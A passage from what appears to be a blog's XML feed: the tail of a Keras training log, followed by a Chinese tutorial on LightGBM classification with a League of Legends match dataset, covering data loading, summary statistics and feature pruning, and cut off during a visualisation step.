val_acc: 0.7956Epoch 75/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6646 - acc: 0.7878 - val_loss: 0.6517 - val_acc: 0.7958Epoch 76/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6625 - acc: 0.7886 - val_loss: 0.6495 - val_acc: 0.7960Epoch 77/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6603 - acc: 0.7890 - val_loss: 0.6475 - val_acc: 0.7970Epoch 78/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6582 - acc: 0.7898 - val_loss: 0.6454 - val_acc: 0.7974Epoch 79/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6562 - acc: 0.7902 - val_loss: 0.6434 - val_acc: 0.7980Epoch 80/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6542 - acc: 0.7908 - val_loss: 0.6414 - val_acc: 0.7982Epoch 81/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6522 - acc: 0.7912 - val_loss: 0.6395 - val_acc: 0.7998Epoch 82/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6502 - acc: 0.7916 - val_loss: 0.6376 - val_acc: 0.7996Epoch 83/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6483 - acc: 0.7920 - val_loss: 0.6357 - val_acc: 0.8002Epoch 84/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6464 - acc: 0.7925 - val_loss: 0.6339 - val_acc: 0.8010Epoch 85/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6445 - acc: 0.7929 - val_loss: 0.6320 - val_acc: 0.8010Epoch 86/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6427 - acc: 0.7935 - val_loss: 0.6302 - val_acc: 0.8016Epoch 87/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6409 - acc: 0.7937 - val_loss: 0.6284 - val_acc: 0.8014Epoch 88/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6391 - acc: 0.7940 - val_loss: 0.6267 - val_acc: 0.8020Epoch 89/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6374 - acc: 0.7945 - val_loss: 0.6250 - val_acc: 0.8022Epoch 90/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6356 - acc: 0.7946 - val_loss: 0.6233 - val_acc: 0.8032Epoch 91/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6340 - acc: 0.7953 - val_loss: 0.6217 - val_acc: 0.8040Epoch 92/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6323 - acc: 0.7957 - val_loss: 0.6199 - val_acc: 0.8050Epoch 93/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6306 - acc: 0.7962 - val_loss: 0.6183 - val_acc: 0.8056Epoch 94/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6290 - acc: 0.7963 - val_loss: 0.6168 - val_acc: 0.8056Epoch 95/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6274 - acc: 0.7969 - val_loss: 0.6152 - val_acc: 0.8056Epoch 96/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6258 - acc: 0.7974 - val_loss: 0.6137 - val_acc: 0.8064Epoch 97/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6242 - acc: 0.7978 - val_loss: 0.6121 - val_acc: 0.8066Epoch 98/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6227 - acc: 0.7986 - val_loss: 0.6106 - val_acc: 0.8068Epoch 99/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6212 - acc: 0.7985 - val_loss: 0.6091 - val_acc: 0.8080Epoch 100/10055000/55000 [==============================] - 2s 44us/sample - loss: 0.6197 - acc: 0.7992 - val_loss: 0.6077 - val_acc: 0.8074&lt;tensorflow.python.keras.callbacks.History at 0x16f1a0a3a20&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于LightGBM的分类预测</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8ELightGBM%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8ELightGBM%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-基于lightgbm的分类预测"><a class="markdownIt-Anchor" href="#1-基于lightgbm的分类预测">#</a> 1. 基于 LightGBM 的分类预测</h1><h2 id="11-lightgbm的介绍"><a class="markdownIt-Anchor" href="#11-lightgbm的介绍">#</a> 1.1 LightGBM 的介绍</h2><p>LightGBM 是 2017 年由微软推出的可扩展机器学习系统，是微软旗下 DMKT 的一个开源项目，由 2014 年首届阿里巴巴大数据竞赛获胜者之一柯国霖老师带领开发。它是一款基于 GBDT（梯度提升决策树）算法的分布式梯度提升框架，为了满足缩短模型计算时间的需求，LightGBM 的设计思路主要集中在减小数据对内存与计算性能的使用，以及减少多机器并行计算时的通讯代价。</p><p>LightGBM 可以看作是 XGBoost 的升级豪华版，在获得与 XGBoost 近似精度的同时，又提供了更快的训练速度与更少的内存消耗。正如其名字中的 Light 所蕴含的那样，LightGBM 在大规模数据集上跑起来更加优雅轻盈，一经推出便成为各种数据竞赛中刷榜夺冠的神兵利器。</p><p>LightGBM 的主要优点：</p><ol><li>简单易用。提供了主流的 Python\C++\R 语言接口，用户可以轻松使用 LightGBM 建模并获得相当不错的效果。</li><li>高效可扩展。在处理大规模数据集时高效迅速、高准确度，对内存等硬件资源要求不高。</li><li>鲁棒性强。相较于深度学习模型不需要精细调参便能取得近似的效果。</li><li>LightGBM 直接支持缺失值与类别特征，无需对数据额外进行特殊处理</li></ol><p>LightGBM 的主要缺点：</p><ol><li>相对于深度学习模型无法对时空位置建模，不能很好地捕获图像、语音、文本等高维数据。</li><li>在拥有海量训练数据，并能找到合适的深度学习模型时，深度学习的精度可以遥遥领先 LightGBM。</li></ol><h2 id="12-lightgbm的应用"><a class="markdownIt-Anchor" href="#12-lightgbm的应用">#</a> 1.2 LightGBM 的应用</h2><p>LightGBM 在机器学习与数据挖掘领域有着极为广泛的应用。据统计 LightGBM 模型自 2016 到 2019 年在 Kaggle 平台上累积获得数据竞赛前三名三十余次，其中包括 CIKM2017 AnalytiCup、IEEE Fraud Detection 等知名竞赛。这些竞赛来源于各行各业的真实业务，这些竞赛成绩表明 LightGBM 具有很好的可扩展性，在各类不同问题上都可以取得非常好的效果。</p><p>同时，LightGBM 还被成功应用在工业界与学术界的各种问题中。例如金融风控、购买行为识别、交通流量预测、环境声音分类、基因分类、生物成分分析等诸多领域。虽然领域相关的数据分析和特性工程在这些解决方案中也发挥了重要作用，但学习者与实践者对 LightGBM 的一致选择表明了这一软件包的影响力与重要性。</p><h1 id="2-实验室手册"><a class="markdownIt-Anchor" href="#2-实验室手册">#</a> 2. 实验室手册</h1><h2 id="21-学习目标"><a class="markdownIt-Anchor" href="#21-学习目标">#</a> 2.1 学习目标</h2><ul><li>了解 LightGBM 的参数与相关知识</li><li>掌握 LightGBM 的 Python 调用并将其运用到英雄联盟游戏胜负预测数据集上</li></ul><h2 id="22-代码流程"><a class="markdownIt-Anchor" href="#22-代码流程">#</a> 2.2 代码流程</h2><h4 id="part1-基于英雄联盟数据集的lightgbm分类实践"><a class="markdownIt-Anchor" href="#part1-基于英雄联盟数据集的lightgbm分类实践">#</a> Part1 基于英雄联盟数据集的 LightGBM 分类实践</h4><p><strong>Step1: 库函数导入</strong></p><p><strong>Step2: 数据读取 / 载入</strong></p><p><strong>Step3: 数据信息简单查看</strong></p><p><strong>Step4: 可视化描述</strong></p><p><strong>Step5: 利用 LightGBM 进行训练与预测</strong></p><p><strong>Step6: 利用 LightGBM 进行特征选择</strong></p><p><strong>Step7: 通过调整参数获得更好的效果</strong></p><h2 id="23-算法实战"><a class="markdownIt-Anchor" href="#23-算法实战">#</a> 2.3 算法实战</h2><h3 id="231-基于英雄联盟数据集的lightgbm分类实战"><a class="markdownIt-Anchor" href="#231-基于英雄联盟数据集的lightgbm分类实战">#</a> 2.3.1 基于英雄联盟数据集的 LightGBM 分类实战</h3><p>在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载需要用到的数据集</span></span><br><span class="line">!wget https://tianchi-media.oss-cn-beijing.aliyuncs.com/DSW/8LightGBM/high_diamond_ranked_10min.csv</span><br></pre></td></tr></table></figure><pre><code>'wget' 不是内部或外部命令，也不是可运行的程序或批处理文件。</code></pre><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  基础函数库</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">## 绘图函数库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br></pre></td></tr></table></figure><p>本次我们选择英雄联盟数据集进行 LightGBM 的场景体验。英雄联盟是 2009 年美国拳头游戏开发的 MOBA 竞技网游，在每局比赛中蓝队与红队在同一个地图进行作战，游戏的目标是破坏敌方队伍的防御塔，进而摧毁敌方的水晶枢纽，拿下比赛的胜利。</p><p>现在共有 9881 场英雄联盟韩服钻石段位以上的排位比赛数据，数据提供了在十分钟时的游戏状态，包括击杀数、死亡数、金币数量、经验值、等级…… 等信息。列 blueWins 是数据的标签，代表了本场比赛是否为蓝队获胜。</p><p>数据的各个特征描述如下：</p><table><thead><tr><th>特征名称</th><th>特征意义</th><th>取值范围</th><th></th><th></th></tr></thead><tbody><tr><td>WardsPlaced</td><td>插眼数量</td><td>整数</td><td></td><td></td></tr><tr><td>WardsDestroyed</td><td>拆眼数量</td><td>整数</td><td></td><td></td></tr><tr><td>FirstBlood</td><td>是否获得首次击杀</td><td>整数</td><td></td><td></td></tr><tr><td>Kills</td><td>击杀英雄数量</td><td>整数</td><td></td><td></td></tr><tr><td>Deaths</td><td>死亡数量</td><td>整数</td><td></td><td></td></tr><tr><td>Assists</td><td>助攻数量</td><td>整数</td><td></td><td></td></tr><tr><td>EliteMonsters</td><td>击杀大型野怪数量</td><td>整数</td><td></td><td></td></tr><tr><td>Dragons</td><td>击杀史诗野怪数量</td><td>整数</td><td></td><td></td></tr><tr><td>Heralds</td><td>击杀峡谷先锋数量</td><td>整数</td><td></td><td></td></tr><tr><td>TowersDestroyed</td><td>推塔数量</td><td>整数</td><td></td><td></td></tr><tr><td>TotalGold</td><td>总经济</td><td>整数</td><td></td><td></td></tr><tr><td>AvgLevel</td><td>平均英雄等级</td><td>浮点数</td><td></td><td></td></tr><tr><td>TotalExperience</td><td>英雄总经验</td><td>整数</td><td></td><td></td></tr><tr><td>TotalMinionsKilled</td><td>英雄补兵数量</td><td>整数</td><td></td><td></td></tr><tr><td>TotalJungleMinionsKilled</td><td>英雄击杀野怪数量</td><td>整数</td><td></td><td></td></tr><tr><td>GoldDiff</td><td>经济差距</td><td>整数</td><td></td><td></td></tr><tr><td>ExperienceDiff</td><td>经验差距</td><td>整数</td><td></td><td></td></tr><tr><td>CSPerMin</td><td>分均补刀</td><td>浮点数</td><td></td><td></td></tr><tr><td>GoldPerMin</td><td>分均经济</td><td>浮点数</td><td></td><td></td></tr></tbody></table><p><strong>Step2: 数据读取 / 载入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 我们利用Pandas自带的read_csv函数读取并转化为DataFrame格式</span></span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;./high_diamond_ranked_10min.csv&#x27;</span>)</span><br><span class="line">y = df.blueWins</span><br></pre></td></tr></table></figure><p><strong>Step3: 数据信息简单查看</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用.info()查看数据的整体信息</span></span><br><span class="line">df.info()</span><br></pre></td></tr></table></figure><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;RangeIndex: 9879 entries, 0 to 9878Data columns (total 40 columns): #   Column                        Non-Null Count  Dtype  ---  ------                        --------------  -----   0   gameId                        9879 non-null   int64   1   blueWins                      9879 non-null   int64   2   blueWardsPlaced               9879 non-null   int64   3   blueWardsDestroyed            9879 non-null   int64   4   blueFirstBlood                9879 non-null   int64   5   blueKills                     9879 non-null   int64   6   blueDeaths                    9879 non-null   int64   7   blueAssists                   9879 non-null   int64   8   blueEliteMonsters             9879 non-null   int64   9   blueDragons                   9879 non-null   int64   10  blueHeralds                   9879 non-null   int64   11  blueTowersDestroyed           9879 non-null   int64   12  blueTotalGold                 9879 non-null   int64   13  blueAvgLevel                  9879 non-null   float64 14  blueTotalExperience           9879 non-null   int64   15  blueTotalMinionsKilled        9879 non-null   int64   16  blueTotalJungleMinionsKilled  9879 non-null   int64   17  blueGoldDiff                  9879 non-null   int64   18  blueExperienceDiff            9879 non-null   int64   19  blueCSPerMin                  9879 non-null   float64 20  blueGoldPerMin                9879 non-null   float64 21  redWardsPlaced                9879 non-null   int64   22  redWardsDestroyed             9879 non-null   int64   23  redFirstBlood                 9879 non-null   int64   24  redKills                      9879 non-null   int64   25  redDeaths                     9879 non-null   int64   26  redAssists                    9879 non-null   int64   27  redEliteMonsters              9879 non-null   int64   28  redDragons                    9879 non-null   int64   29  redHeralds                    9879 non-null   int64   30  redTowersDestroyed            9879 non-null   int64   31  redTotalGold                  9879 non-null   int64   32  redAvgLevel                   9879 non-null   float64 33  redTotalExperience            9879 non-null   int64   34  redTotalMinionsKilled         9879 non-null   int64   35  redTotalJungleMinionsKilled   9879 non-null   int64   36  redGoldDiff                   9879 non-null   int64   37  redExperienceDiff             9879 non-null   int64   38  redCSPerMin                   9879 non-null   float64 39  redGoldPerMin                 9879 non-null   float64dtypes: float64(6), int64(34)memory usage: 3.0 MB</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部</span></span><br><span class="line">df.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>gameId</th>      <th>blueWins</th>      <th>blueWardsPlaced</th>      <th>blueWardsDestroyed</th>      <th>blueFirstBlood</th>      <th>blueKills</th>      <th>blueDeaths</th>      <th>blueAssists</th>      <th>blueEliteMonsters</th>      <th>blueDragons</th>      <th>...</th>      <th>redTowersDestroyed</th>      <th>redTotalGold</th>      <th>redAvgLevel</th>      <th>redTotalExperience</th>      <th>redTotalMinionsKilled</th>      <th>redTotalJungleMinionsKilled</th>      <th>redGoldDiff</th>      <th>redExperienceDiff</th>      <th>redCSPerMin</th>      <th>redGoldPerMin</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>4519157822</td>      <td>0</td>      <td>28</td>      <td>2</td>      <td>1</td>      <td>9</td>      <td>6</td>      <td>11</td>      <td>0</td>      <td>0</td>      <td>...</td>      <td>0</td>      <td>16567</td>      <td>6.8</td>      <td>17047</td>      <td>197</td>      <td>55</td>      <td>-643</td>      <td>8</td>      <td>19.7</td>      <td>1656.7</td>    </tr>    <tr>      <th>1</th>      <td>4523371949</td>      <td>0</td>      <td>12</td>      <td>1</td>      <td>0</td>      <td>5</td>      <td>5</td>      <td>5</td>      <td>0</td>      <td>0</td>      <td>...</td>      <td>1</td>      <td>17620</td>      <td>6.8</td>      <td>17438</td>      <td>240</td>      <td>52</td>      <td>2908</td>      <td>1173</td>      <td>24.0</td>      <td>1762.0</td>    </tr>    <tr>      <th>2</th>      <td>4521474530</td>      <td>0</td>      <td>15</td>      <td>0</td>      <td>0</td>      <td>7</td>      <td>11</td>      <td>4</td>      <td>1</td>      <td>1</td>      <td>...</td>      <td>0</td>      <td>17285</td>      <td>6.8</td>      <td>17254</td>      <td>203</td>      <td>28</td>      <td>1172</td>      <td>1033</td>      <td>20.3</td>      <td>1728.5</td>    </tr>    <tr>      <th>3</th>      <td>4524384067</td>      <td>0</td>      <td>43</td>      <td>1</td>      <td>0</td>      <td>4</td>      <td>5</td>      <td>5</td>      <td>1</td>      <td>0</td>      <td>...</td>      <td>0</td>      <td>16478</td>      <td>7.0</td>      <td>17961</td>      <td>235</td>      <td>47</td>      <td>1321</td>      <td>7</td>      <td>23.5</td>      <td>1647.8</td>    </tr>    <tr>      <th>4</th>      <td>4436033771</td>      <td>0</td>      <td>75</td>      <td>4</td>      <td>0</td>      <td>6</td>      <td>6</td>      <td>6</td>      <td>0</td>      <td>0</td>      <td>...</td>      <td>0</td>      <td>17404</td>      <td>7.0</td>      <td>18313</td>      <td>225</td>      <td>67</td>      <td>1004</td>      <td>-230</td>      <td>22.5</td>      <td>1740.4</td>    </tr>  </tbody></table><p>5 rows × 40 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.tail()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>gameId</th>      <th>blueWins</th>      <th>blueWardsPlaced</th>      <th>blueWardsDestroyed</th>      <th>blueFirstBlood</th>      <th>blueKills</th>      <th>blueDeaths</th>      <th>blueAssists</th>      <th>blueEliteMonsters</th>      <th>blueDragons</th>      <th>...</th>      <th>redTowersDestroyed</th>      <th>redTotalGold</th>      <th>redAvgLevel</th>      <th>redTotalExperience</th>      <th>redTotalMinionsKilled</th>      <th>redTotalJungleMinionsKilled</th>      <th>redGoldDiff</th>      <th>redExperienceDiff</th>      <th>redCSPerMin</th>      <th>redGoldPerMin</th>    </tr>  </thead>  <tbody>    <tr>      <th>9874</th>      <td>4527873286</td>      <td>1</td>      <td>17</td>      <td>2</td>      <td>1</td>      <td>7</td>      <td>4</td>      <td>5</td>      <td>1</td>      <td>1</td>      <td>...</td>      <td>0</td>      <td>15246</td>      <td>6.8</td>      <td>16498</td>      <td>229</td>      <td>34</td>      <td>-2519</td>      <td>-2469</td>      <td>22.9</td>      <td>1524.6</td>    </tr>    <tr>      <th>9875</th>      <td>4527797466</td>      <td>1</td>      <td>54</td>      <td>0</td>      <td>0</td>      <td>6</td>      <td>4</td>      <td>8</td>      <td>1</td>      <td>1</td>      <td>...</td>      <td>0</td>      <td>15456</td>      <td>7.0</td>      <td>18367</td>      <td>206</td>      <td>56</td>      <td>-782</td>      <td>-888</td>      <td>20.6</td>      <td>1545.6</td>    </tr>    <tr>      <th>9876</th>      <td>4527713716</td>      <td>0</td>      <td>23</td>      <td>1</td>      <td>0</td>      <td>6</td>      <td>7</td>      <td>5</td>      <td>0</td>      <td>0</td>      <td>...</td>      <td>0</td>      <td>18319</td>      <td>7.4</td>      <td>19909</td>      <td>261</td>      <td>60</td>      <td>2416</td>      <td>1877</td>      <td>26.1</td>      <td>1831.9</td>    </tr>    <tr>      <th>9877</th>      <td>4527628313</td>      <td>0</td>      <td>14</td>      <td>4</td>      <td>1</td>      <td>2</td>      <td>3</td>      <td>3</td>      <td>1</td>      <td>1</td>      <td>...</td>      <td>0</td>      <td>15298</td>      <td>7.2</td>      <td>18314</td>      <td>247</td>      <td>40</td>      <td>839</td>      <td>1085</td>      <td>24.7</td>      <td>1529.8</td>    </tr>    <tr>      <th>9878</th>      <td>4523772935</td>      <td>1</td>      <td>18</td>      <td>0</td>      <td>1</td>      <td>6</td>      <td>6</td>      <td>5</td>      <td>0</td>      <td>0</td>      <td>...</td>      <td>0</td>      <td>15339</td>      <td>6.8</td>      <td>17379</td>      <td>201</td>      <td>46</td>      <td>-927</td>      <td>58</td>      <td>20.1</td>      <td>1533.9</td>    </tr>  </tbody></table><p>5 rows × 40 columns</p></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 标注标签并利用value_counts函数查看训练集标签的数量</span></span><br><span class="line">y = df.blueWins</span><br><span class="line">y.value_counts()</span><br></pre></td></tr></table></figure><pre><code>0    49491    4930Name: blueWins, dtype: int64</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 标注特征列</span></span><br><span class="line">drop_cols = [<span class="string">&#x27;gameId&#x27;</span>,<span class="string">&#x27;blueWins&#x27;</span>]</span><br><span class="line">x = df.drop(drop_cols, axis=<span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 对于特征进行一些统计描述</span></span><br><span class="line">x.describe()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>blueWardsPlaced</th>      <th>blueWardsDestroyed</th>      <th>blueFirstBlood</th>      <th>blueKills</th>      <th>blueDeaths</th>      <th>blueAssists</th>      <th>blueEliteMonsters</th>      <th>blueDragons</th>      <th>blueHeralds</th>      <th>blueTowersDestroyed</th>      <th>...</th>      <th>redTowersDestroyed</th>      <th>redTotalGold</th>      <th>redAvgLevel</th>      <th>redTotalExperience</th>      <th>redTotalMinionsKilled</th>      <th>redTotalJungleMinionsKilled</th>      <th>redGoldDiff</th>      <th>redExperienceDiff</th>      <th>redCSPerMin</th>      <th>redGoldPerMin</th>    </tr>  </thead>  <tbody>    <tr>      <th>count</th>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>...</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>      <td>9879.000000</td>    </tr>    <tr>      <th>mean</th>      <td>22.288288</td>      <td>2.824881</td>      <td>0.504808</td>      <td>6.183925</td>      <td>6.137666</td>      <td>6.645106</td>      <td>0.549954</td>      <td>0.361980</td>      <td>0.187974</td>      <td>0.051422</td>      <td>...</td>      <td>0.043021</td>      <td>16489.041401</td>      <td>6.925316</td>      <td>17961.730438</td>      <td>217.349226</td>      <td>51.313088</td>      <td>-14.414111</td>      <td>33.620306</td>      <td>21.734923</td>      <td>1648.904140</td>    </tr>    <tr>      <th>std</th>      <td>18.019177</td>      <td>2.174998</td>      <td>0.500002</td>      <td>3.011028</td>      <td>2.933818</td>      <td>4.064520</td>      <td>0.625527</td>      <td>0.480597</td>      <td>0.390712</td>      <td>0.244369</td>      <td>...</td>      <td>0.216900</td>      <td>1490.888406</td>      <td>0.305311</td>      <td>1198.583912</td>      <td>21.911668</td>      <td>10.027885</td>      <td>2453.349179</td>      <td>1920.370438</td>      <td>2.191167</td>      <td>149.088841</td>    </tr>    <tr>      <th>min</th>      <td>5.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>...</td>      <td>0.000000</td>      <td>11212.000000</td>      <td>4.800000</td>      <td>10465.000000</td>      <td>107.000000</td>      <td>4.000000</td>      <td>-11467.000000</td>      <td>-8348.000000</td>      <td>10.700000</td>      <td>1121.200000</td>    </tr>    <tr>      <th>25%</th>      <td>14.000000</td>      <td>1.000000</td>      <td>0.000000</td>      <td>4.000000</td>      <td>4.000000</td>      <td>4.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>...</td>      <td>0.000000</td>      <td>15427.500000</td>      <td>6.800000</td>      <td>17209.500000</td>      <td>203.000000</td>      <td>44.000000</td>      <td>-1596.000000</td>      <td>-1212.000000</td>      <td>20.300000</td>      <td>1542.750000</td>    </tr>    <tr>      <th>50%</th>      <td>16.000000</td>      <td>3.000000</td>      <td>1.000000</td>      <td>6.000000</td>      <td>6.000000</td>      <td>6.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>...</td>      <td>0.000000</td>      <td>16378.000000</td>      <td>7.000000</td>      <td>17974.000000</td>      <td>218.000000</td>      <td>51.000000</td>      <td>-14.000000</td>      <td>28.000000</td>      <td>21.800000</td>      <td>1637.800000</td>    </tr>    <tr>      <th>75%</th>      <td>20.000000</td>      <td>4.000000</td>      <td>1.000000</td>      <td>8.000000</td>      <td>8.000000</td>      <td>9.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>0.000000</td>      <td>0.000000</td>      <td>...</td>      <td>0.000000</td>      <td>17418.500000</td>      <td>7.200000</td>      <td>18764.500000</td>      <td>233.000000</td>      <td>57.000000</td>      <td>1585.500000</td>      <td>1290.500000</td>      <td>23.300000</td>      <td>1741.850000</td>    </tr>    <tr>      <th>max</th>      <td>250.000000</td>      <td>27.000000</td>      <td>1.000000</td>      <td>22.000000</td>      <td>22.000000</td>      <td>29.000000</td>      <td>2.000000</td>      <td>1.000000</td>      <td>1.000000</td>      <td>4.000000</td>      <td>...</td>      <td>2.000000</td>      <td>22732.000000</td>      <td>8.200000</td>      <td>22269.000000</td>      <td>289.000000</td>      <td>92.000000</td>      <td>10830.000000</td>      <td>9333.000000</td>      <td>28.900000</td>      <td>2273.200000</td>    </tr>  </tbody></table><p>8 rows × 38 columns</p></div><ul><li>我们发现不同对局中插眼数和拆眼数的取值范围存在明显差距，甚至有前十分钟插了 250 个眼的异常值。</li><li>我们发现 EliteMonsters 的取值相当于 Deagons + Heralds。</li><li>我们发现 TotalGold 等变量在大部分对局中差距不大。</li><li>我们发现两支队伍的经济差和经验差是相反数。</li><li>我们发现红队和蓝队拿到首次击杀的概率大概都是 50%</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 根据上面的描述，我们可以去除一些重复变量，比如只要知道蓝队是否拿到一血，我们就知道红队有没有拿到，可以去除红队的相关冗余数据。</span></span><br><span class="line">drop_cols = [<span class="string">&#x27;redFirstBlood&#x27;</span>,<span class="string">&#x27;redKills&#x27;</span>,<span class="string">&#x27;redDeaths&#x27;</span></span><br><span class="line">             ,<span class="string">&#x27;redGoldDiff&#x27;</span>,<span class="string">&#x27;redExperienceDiff&#x27;</span>, <span class="string">&#x27;blueCSPerMin&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;blueGoldPerMin&#x27;</span>,<span class="string">&#x27;redCSPerMin&#x27;</span>,<span class="string">&#x27;redGoldPerMin&#x27;</span>]</span><br><span class="line">x.drop(drop_cols, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>Step4: 可视化描述</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">data = x</span><br><span class="line">data_std = (data - data.mean()) / data.std()</span><br><span class="line">data = pd.concat([y, data_std.iloc[:, <span class="number">0</span>:<span class="number">9</span>]], axis=<span class="number">1</span>)</span><br><span class="line">data = pd.melt(data, id_vars=<span 